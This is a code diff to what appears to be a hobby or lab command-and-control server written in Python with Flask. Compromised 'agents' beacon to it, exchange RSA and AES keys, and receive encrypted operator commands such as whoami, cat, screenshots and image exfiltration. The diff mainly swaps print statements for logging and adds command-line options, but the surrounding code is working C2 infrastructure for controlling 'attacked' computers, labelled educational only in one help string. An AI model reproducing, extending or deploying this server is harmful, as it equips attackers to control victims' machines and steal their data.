@@ -12,6 +12,8 @@ import queue
 import threading
 import socket
 from loguru import logger
+import argparse
+from log_setup import setup_logging
 
 # all the possible commands for the agents
 COMMANDS = {'cat','dir','whoami','SCREENSHOT','SEND_IMG'}
@@ -23,16 +25,13 @@ admin_responses = []
 # Define a GET route for the home/root URL- default rooting - just for homepage
 @app.route('/', methods=['GET'])
 def home():
-    print(request.headers)
-    print(request)
-    print(request.remote_addr)
-    print(request.data)
-    print(request.method)
-    print("the agent id is:")
-    print(request.headers.get('Agent-Id'))
+    logger.debug(request)
+    logger.debug(request.data)
+    logger.debug(request.method)
+    logger.debug(f"the agent id is: {request.headers.get('Agent-Id')}")
     data = request.get_json(silent=True)
-    print(data)
-    return "Hello, World! Your Flask HTTP server is running."
+    logger.debug(data)
+    return "Hello World! Your Flask HTTP server is running."
 
 #the main route for client beacon
 @app.route('/getkeys', methods=['GET'])
@@ -44,9 +43,9 @@ def get_keys():
     else:
         logger.debug("first time of the agent at the server")
         users_in_server[agent_id] = {'aes_key':"" , 'ip_addr':f"{request.remote_addr}", "is_encrypted":False , 'last_seen':f'{str(datetime.datetime.now())}'}
-    print(request)
-    print(request.data)
-    print(request.headers)
+    logger.debug(request)
+    logger.debug(request.data)
+    logger.debug(request.headers)
     data = request.get_json(silent=True)
     logger.debug("thtts the thing before data")
     #the data should be empty in the keys replace
@@ -67,12 +66,12 @@ def handle_json2():
     logger.info("the agent send his aes key")
     agent_id = request.headers.get('Agent-Id')
     data = request.get_json(silent=True)
-    print(request)
-    print(request.get_data())
-    print(request.method)
-    print(request.headers)
-    print("the  data from client is : ")
-    print(data)
+    logger.debug(request)
+    logger.debug(request.get_data())
+    logger.debug(request.method)
+    logger.debug(request.headers)
+    logger.debug("the  data from client is : ")
+    logger.debug(data)
     #we recieve the aes key int str, but is actually an int which represent bytes!!
     encrypted_aes = data.get('aes_key_int')
     #decrypt the aes key by the int version
@@ -105,11 +104,11 @@ def handle_json3():
     content = (data["content"])
     base_64_decode = base64.b64decode(content)
     iv = int(data["iv"])
-    print(request)
-    print(request.get_data())
-    print(request.method)
-    print(request.headers)
-    print(data)
+    logger.debug(request)
+    logger.debug(request.get_data())
+    logger.debug(request.method)
+    logger.debug(request.headers)
+    logger.debug(data)
 
     iv_byte_length = (iv.bit_length() + 7) // 8
     #content_byte_length = (content.bit_length()+7)//8
@@ -133,10 +132,10 @@ def handle_json3():
         except ConnectionResetError:
             logger.debug("Client closed connection")
     else:
-        print("the decrypted content is:\n")
-        print(unpaded_decrypted_content.decode('utf-8'))
+        logger.debug("the decrypted content is:\n")
+        logger.debug(unpaded_decrypted_content.decode('utf-8'))
         decoded_text = unpaded_decrypted_content.decode('utf-8')
-        print(f"the full content is {unpaded_decrypted_content}and type is {type(unpaded_decrypted_content)}")
+        logger.debug(f"the full content is {unpaded_decrypted_content}and type is {type(unpaded_decrypted_content)}")
         admin_responses.insert(0, {"agent": agent_id, "time": str(datetime.datetime.now().strftime("%H:%M:%S")),
                                    "data": decoded_text})
     if not data:
@@ -151,8 +150,8 @@ def encrypt_command_with_aes(command: str, aes_key: str) -> bytes:
     bytes_aes_key_active = bytes_aes_key.to_bytes(16, 'little')
     padded_command = encryptions.aes_padder(command.encode('utf-8'))
     encrypted_command = encryptions.aes_encryption(padded_command, bytes_aes_key_active, iv)
-    print(iv)
-    print(encrypted_command)
+    logger.debug(iv)
+    logger.debug(encrypted_command)
     return iv, encrypted_command
 
 
@@ -233,22 +232,22 @@ def run_http_server(host,port):
 # its ok - it send the command to the client (attacked computer)
 def get_command_byClient(queue):
  while True:
-     print(users_in_server)
+     logger.debug(users_in_server)
      #specifie the command for each agent (client)
      specific_agent = input("please enter your agent")
      #check if we know this agent and he is in encryption modde
      if specific_agent in users_in_server and users_in_server[specific_agent]['is_encrypted'] == 'True':
-         print(users_in_server)
+         logger.debug(users_in_server)
          commands = input("please enter command for the server")
          queue.put(commands)
      else:
-         print("encryption not ready yet / no user in the system")
+         logger.info("encryption not ready yet / no user in the system")
 
 def queue_mode(q):
  while True:
      time.sleep(10)
-     print(list(q.queue))
-     print(users_in_server)
+     logger.debug(list(q.queue))
+     logger.debug(users_in_server)
 
 #-----------------------------------------------------------------------
 #set encryption numbers:
@@ -270,15 +269,27 @@ logger.info(f"the server has created the queue and inserted both public key, N")
 logger.info(f"the protocoled publickey is :{protocoled_public_key}")
 logger.info(f"the protocoled N is :{protocoled_N}")
 #-----------------------------------------------------------------------
-t1 = threading.Thread(target=run_http_server, args=('127.0.0.1', 5050))
-t2 = threading.Thread(target=get_command_byClient, args=(q,))
-t3 = threading.Thread(target=queue_mode, args=(q,))
-#-----------------------------------------------------------------------
+def parse_args():
+    p = argparse.ArgumentParser(description="HTTP C2 server (educational, lab use only)")
+    p.add_argument("--host", default="127.0.0.1", help="Host/IP to bind")
+    p.add_argument("--port", type=int, default=5050, help="Port to listen on")
+    return p.parse_args()
 
-t1.start()
-time.sleep(1)
-t2.start()
-t3.start()
+
+def main():
+    setup_logging()
+    args = parse_args()
+    t1 = threading.Thread(target=run_http_server, args=(args.host, args.port))
+    t2 = threading.Thread(target=get_command_byClient, args=(q,))
+    t3 = threading.Thread(target=queue_mode, args=(q,))
+    t1.start()
+    time.sleep(1)
+    t2.start()
+    t3.start()
+
+
+if __name__ == "__main__":
+    main()
 
 
 
